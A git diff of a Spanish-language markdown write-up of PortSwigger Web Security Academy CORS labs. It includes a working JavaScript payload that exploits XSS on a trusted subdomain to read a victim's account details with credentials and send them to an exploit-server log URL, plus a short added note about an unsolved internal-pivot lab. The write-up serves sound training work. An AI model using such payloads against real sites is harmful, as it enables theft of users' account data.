@@ -734,11 +734,15 @@ Ahora, analizando con el intecept de burpsuite la ventana que se abre al clickea
 
 Para resolver el laboratorio, en el siguiente script deberemos pegar la url del mismo, teniendo cuidado en la línea de document.location, ya que en la misma debe ir el subdominio de la ventana que se abre al hacer click en Check stock. La url que debe ir dentro de la función reqListener es la del exploit server.
 
-```javascript
+```html
 <script>
    document.location="http://stock.ac6e1ff21fdb2eaa8059129e00570000.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac6e1ff21fdb2eaa8059129e00570000.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ac631f561f612e128085127d0143004d.web-security-academy.net/exploit/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
+
+### [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
+
+No pudimos resolver el laboratorio porque se requiere usar el Burp Collaborator Client, que sólo están disponibles en la versión Pro de Burp Suite.
 
 ---
 
